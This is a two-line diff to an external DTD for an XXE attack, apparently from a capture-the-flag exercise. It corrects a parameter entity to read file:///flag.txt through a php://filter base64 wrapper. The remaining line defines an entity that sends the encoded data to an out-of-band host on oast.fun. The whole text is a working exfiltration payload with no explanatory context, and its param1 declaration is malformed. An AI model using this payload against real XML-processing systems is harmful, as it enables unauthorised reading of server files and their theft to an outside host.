@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "://filter/read=convert.base64-encode/resource=file:///flag.txt">
+<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt">
 <!ENTITY % param1 =<!ENTITY exfil SYSTEM 'http://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/?x=%data;'>">
